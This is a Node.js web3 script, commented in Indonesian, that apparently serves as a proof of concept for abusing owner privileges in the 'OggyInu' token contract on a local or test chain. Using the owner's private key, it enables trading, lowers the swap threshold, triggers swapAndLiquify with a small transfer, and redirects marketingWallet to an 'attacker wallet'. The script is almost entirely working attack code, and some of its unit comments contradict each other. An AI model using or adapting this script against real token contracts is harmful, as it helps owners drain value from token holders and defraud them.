const Web3 = require('web3');
const fs = require('fs');

// Konfigurasi Web3 (Gunakan Ganache atau BSC testnet)
const web3 = new Web3('http://127.0.0.1:8545'); // Ganti dengan RPC Anda

// ABI kontrak
const contractABI = JSON.parse(fs.readFileSync('OggyInuABI.json', 'utf8'));
const contractAddress = '0xYourDeployedContractAddress'; // Ganti dengan alamat kontrak
const contract = new web3.eth.Contract(contractABI, contractAddress);

// Akun dan kunci privat
const ownerAccount = '0xOwnerAddress'; // Pemilik (akun[0] di Ganache)
const userAccount = '0xUserAddress';  // Pengguna biasa (akun[1])
const attackerWallet = '0xAttackerWallet'; // Dompet pribadi pemilik (akun[2])
const privateKeyOwner = '0xOwnerPrivateKey';
const privateKeyUser = '0xUserPrivateKey';

// Fungsi untuk cek saldo
async function checkBalances() {
    const ownerBalance = await contract.methods.balanceOf(ownerAccount).call();
    const contractBalance = await contract.methods.balanceOf(contractAddress).call();
    const attackerBalance = await web3.eth.getBalance(attackerWallet);
    console.log(`Owner Balance: ${web3.utils.fromWei(ownerBalance, 'gwei')} OGGY`);
    console.log(`Contract Balance: ${web3.utils.fromWei(contractBalance, 'gwei')} OGGY`);
    console.log(`Attacker Wallet Balance: ${web3.utils.fromWei(attackerBalance, 'ether')} BNB`);
}

// Fungsi untuk eksploitasi
async function smallPriceManipulation() {
    try {
        console.log("=== Sebelum Manipulasi ===");
        await checkBalances();

        // 1. Aktifkan trading
        const enableTradingTx = contract.methods.EnableTrading();
        const enableTradingData = enableTradingTx.encodeABI();
        const enableTradingSigned = await web3.eth.accounts.signTransaction(
            {
                to: contractAddress,
                data: enableTradingData,
                gas: 200000,
            },
            privateKeyOwner
        );
        await web3.eth.sendSignedTransaction(enableTradingSigned.rawTransaction);
        console.log("Trading diaktifkan.");

        // 2. Turunkan swapTokensAtAmount ke nilai kecil
        const newSwapAmount = web3.utils.toWei('1', 'gwei'); // 1e12 (1 miliar token)
        const updateSwapTx = contract.methods.updateSwapTokensAtAmount(1); // 1 * 10^9
        const updateSwapData = updateSwapTx.encodeABI();
        const updateSwapSigned = await web3.eth.accounts.signTransaction(
            {
                to: contractAddress,
                data: updateSwapData,
                gas: 200000,
            },
            privateKeyOwner
        );
        await web3.eth.sendSignedTransaction(updateSwapSigned.rawTransaction);
        console.log("swapTokensAtAmount diturunkan ke 1 miliar token.");

        // 3. Transfer kecil untuk memicu swapAndLiquify
        const transferAmount = web3.utils.toWei('2000', 'gwei'); // 2 miliar token (> swapTokensAtAmount)
        const transferTx = contract.methods.transfer(userAccount, transferAmount);
        const transferData = transferTx.encodeABI();
        const transferSigned = await web3.eth.accounts.signTransaction(
            {
                to: contractAddress,
                data: transferData,
                gas: 300000,
            },
            privateKeyOwner
        );
        await web3.eth.sendSignedTransaction(transferSigned.rawTransaction);
        console.log("Transfer kecil dilakukan untuk memicu swapAndLiquify.");

        // 4. Ubah marketingWallet ke dompet penyerang
        const updateWalletTx = contract.methods.updateMarketingWallet(attackerWallet);
        const updateWalletData = updateWalletTx.encodeABI();
        const updateWalletSigned = await web3.eth.accounts.signTransaction(
            {
                to: contractAddress,
                data: updateWalletData,
                gas: 200000,
            },
            privateKeyOwner
        );
        await web3.eth.sendSignedTransaction(updateWalletSigned.rawTransaction);
        console.log("marketingWallet diubah ke dompet penyerang.");

        // 5. Cek saldo setelah manipulasi
        console.log("=== Setelah Manipulasi ===");
        await checkBalances();

        // Catatan: Dalam testnet nyata, pemilik bisa ulangi transfer kecil untuk memicu swap berulang
    } catch (error) {
        console.error("Error selama manipulasi: ", error);
    }
}

// Jalankan eksploitasi
smallPriceManipulation();

